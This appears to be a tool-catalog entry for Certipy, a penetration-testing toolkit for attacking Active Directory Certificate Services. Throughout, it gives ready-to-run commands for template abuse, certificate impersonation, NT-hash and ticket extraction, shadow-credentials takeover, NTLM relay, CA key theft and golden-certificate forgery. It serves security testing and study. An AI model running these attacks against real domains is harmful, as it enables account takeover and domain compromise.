---
name: "certipy"
categories:
  - blackarch-windows
version: "5.1.0.r12.g3ae3442"
homepage: "https://github.com/ly4k/Certipy"
packaged-by: [blackarch, nixpkgs]
blackarch-builddate: "2026-08-02"
build-system: windows
license: MIT
meta-checked: "2026-11-09"
github-repo: "ly4k/Certipy"
github-stars: 3720
github-pushed: "2026-07-30"
github-archived: false
github-issues: 38
github-match: "exact"
gh-checked: "2026-11-07"
worth: 7.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 21
gh-activity-checked: "2026-11-09"
---

# certipy

> The AD CS attack toolkit: enumerate certificate services, exploit misconfigured templates, and cash certificates out as NT hashes and Kerberos tickets.

## What it's for

Attacking an enterprise PKI from a Linux host. Certipy (by ly4k) covers the whole Active Directory Certificate Services chain: LDAP enumeration of CAs and templates against the ESC1–ESC17 misconfiguration classes, certificate requests that impersonate other principals, PKINIT authentication that recovers the bound account's NT hash, NTLM relay to enrollment endpoints, shadow-credentials account takeover, template and account manipulation, and offline forgery of "golden" certificates from a stolen CA key. Every domain-facing command shares the same credential options — password, `-hashes` (pass-the-hash) or `-k` (Kerberos ccache) — plus `-dc-ip`/`-target` for reachability, so it chains cleanly through tunnels such as proxychains. A `parse` sub-command replays the same vulnerability analysis offline on registry or BOF dumps when no domain access exists. It weaponizes misconfigurations; without a real one (or rights), there is nothing for it to exploit. The same upstream ships as [[certipy-ad]] on Parrot/Kali — the PyPI distribution is `certipy-ad` and the console script is `certipy`, so both note names describe one tool, and that note covers the identical commands.

## Typical use cases

### Enumerate AD CS and triage vulnerable templates

```
certipy find -u user@example.com -p 'Password1' -dc-ip 198.51.100.10 -vulnerable -stdout
```

Outcome: connects over LDAP(S), enumerates all CAs, templates and enrollment endpoints, and prints only the ones with exploitable misconfigurations (ESC1–ESC17), each with the reason it is vulnerable. Drop `-vulnerable` for a full inventory; swap `-p` for `-hashes :<nthash>` or `-k -no-pass` to use a hash or Kerberos ccache; `-json`/`-csv`/`-text` write a report file instead of `-stdout`; `-ns`/`-dns-tcp` steer DNS resolution when the domain's name server differs from the DC.

### Request a certificate as another principal (ESC1)

```
certipy req -u user@example.com -p 'Password1' -dc-ip 198.51.100.10 -ca 'example-CA' -template 'VulnTemplate' -upn 'administrator@example.com'
```

Outcome: enrolls via RPC against a template that permits enrollee-supplied subject, injects the target UPN into the certificate SAN, and writes `administrator.pfx` — a client-authentication certificate usable as that principal. `-dns` or `-sid` substitute a different SAN type; `-target` names the host running the CA when it is not the DC; `-web`/`-dcom` switch the enrollment protocol (web enrollment or DCOM instead of RPC).

### Turn a PFX into an NT hash and a TGT

```
certipy auth -pfx administrator.pfx -dc-ip 198.51.100.10
```

Outcome: authenticates via Kerberos PKINIT with the certificate, prints the bound account's NT hash and saves its TGT to `administrator.ccache`. For machine-account certificates pass `-username 'dc01$' -domain example.com`; `-ldap-shell` authenticates via Schannel and drops into an interactive LDAP shell instead; `-kirbi`/`-print` emit the ticket in Rubeus (kirbi) format for Windows-side tooling.

### Shadow credentials: automatic account takeover

```
certipy shadow auto -u user@example.com -p 'Password1' -dc-ip 198.51.100.10 -account 'winrm_svc'
```

Outcome: with GenericWrite-style rights over the target, adds a Key Credential Link to its `msDS-KeyCredentialLink`, requests a client-authentication certificate for it, authenticates via PKINIT, prints the target's NT hash and saves its ccache, then removes the link again. `shadow list|add|remove|clear|info` manipulate the links manually when the automatic path is too loud or needs to persist.

### Rewrite a template you control (ESC4)

```
certipy template -u user@example.com -p 'Password1' -dc-ip 198.51.100.10 -template 'WorkstationAuth' -write-default-configuration
```

Outcome: saves the template's current configuration to `WorkstationAuth.json`, then rewrites the template to Certipy's ESC1-vulnerable defaults — enrollee-supplied SAN allowed, client-authentication EKU, broad enrollment rights, no manager approval. Follow immediately with `req` against the same template; `-write-configuration` restores the saved JSON to put the template back.

### Create and shape machine accounts

```
certipy account create -u user@example.com -p 'Password1' -dc-ip 198.51.100.10 -user 'evil01$' -pass 'Password1' -dns 'ws01.example.com'
```

Outcome: creates a computer account (bounded by the domain's MachineAccountQuota) with the given password and attributes; `-upn`, `-sam`, `-spns` and `-group` are settable at creation time. On existing accounts, `account update -user 'victim' -upn 'administrator'` flips attributes — the UPN swap that feeds ESC9/ESC10-style certificate-binding confusion — while `account read` and `account delete` inspect and remove.

### Relay coerced NTLM to the CA (ESC8/ESC11)

```
certipy relay -target 'http://ca.example.com/' -template 'DomainController'
```

Outcome: starts an SMB listener on port 445; authentication coerced from a victim (via any PetitPotam-style coercion) is relayed to the CA's web-enrollment endpoint and a certificate for the victim is saved as PFX. Use `-target 'rpc://ca.example.com/' -ca 'example-CA'` when the CA's ICPR interface lacks enforced encryption (ESC11); `-forever` keeps relaying after the first hit.

### Back up the CA's certificate and key (ESC7)

```
certipy ca -u caadmin@example.com -p 'Password1' -target ca.example.com -config 'ca.example.com\example-CA' -backup
```

Outcome: with ManageCA/ManageCertificates rights, performs the backup through a temporary CA service and saves the CA certificate and its private signing key to `example-CA.pfx` — the material golden certificates are made of. The same sub-command manages the CA day to day: `-add-officer`/`-remove-officer` grant certificate-manager rights, `-enable-template` publishes a template, `-issue-request` approves a pending request.

### Forge a golden certificate offline

```
certipy forge -ca-pfx example-CA.pfx -upn 'administrator@example.com' -crl 'ldap:///'
```

Outcome: signs a fresh certificate for any identity using the stolen CA key — with no contact to the CA or domain — and saves it as `administrator_forged.pfx`, ready for `certipy auth`. The dummy CDP in `-crl` matters: the KDC expects a CRL distribution point to be present. `-subject`, `-sid`, `-template` (clone another certificate's properties), `-key-size` and `-validity-period` shape the forged certificate.

### Repack and split PFX files locally

```
certipy cert -export -pfx legacy.pfx -password 'Password1' -export-password 'NewPass1' -out repacked.pfx
```

Outcome: purely local key handling — loads the input PFX and writes a new one under a different password (useful when downstream tooling rejects the original protection). `-key`/`-cert` assemble a PFX from separate PEM or DER files; `-nokey`/`-nocert` strip a PFX to a single component.

### Request a certificate on behalf of a victim (ESC3)

```
certipy req -u user@example.com -p 'Password1' -dc-ip 198.51.100.10 -ca 'example-CA' -template 'User' -pfx agent.pfx -on-behalf-of 'CORP\Administrator'
```

Outcome: authenticates the enrollment with an Enrollment Agent certificate (`-pfx`, one carrying the Certificate Request Agent EKU — e.g. obtained from an ESC3 or ESC2 template) and has the CA issue a certificate for the named victim, saved as a PFX ready for `certipy auth`. `-on-behalf-of` takes the `NETBIOSDOMAIN\SamAccountName` form, not a UPN.

### Renew a certificate from its PFX

```
certipy req -u user@example.com -p 'Password1' -dc-ip 198.51.100.10 -ca 'example-CA' -template 'User' -pfx user.pfx -renew -out user_renewed.pfx
```

Outcome: authenticates with the existing certificate instead of a password and submits a renewal rather than a fresh enrollment — extends an about-to-expire certificate (or reissues after template surgery) while keeping its key and subject. `-pfx` is the credential source for both `-renew` and `-on-behalf-of`.

### Retrieve an issued certificate by request ID

```
certipy req -u user@example.com -p 'Password1' -dc-ip 198.51.100.10 -ca 'example-CA' -target ca.example.com -retrieve 785
```

Outcome: downloads a certificate the CA has already issued — no new CSR is submitted. It is the closing step of the ESC7 approval chain: `certipy ca -issue-request 785` has a certificate officer approve the pending request, then `-retrieve 785` fetches the resulting PFX.

### Open an LDAP shell over plain LDAP

```
certipy auth -pfx user.pfx -dc-ip 198.51.100.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```

Outcome: `-ldap-shell` performs a Schannel bind with the certificate and drops into the interactive LDAP shell (create users/computers, set SPNs, ...). It defaults to LDAPS on 636; `-ldap-scheme ldap -ldap-port 389` force the bind over plaintext LDAP for domains that do not expose LDAPS — the same two flags steer every command's LDAP connection.
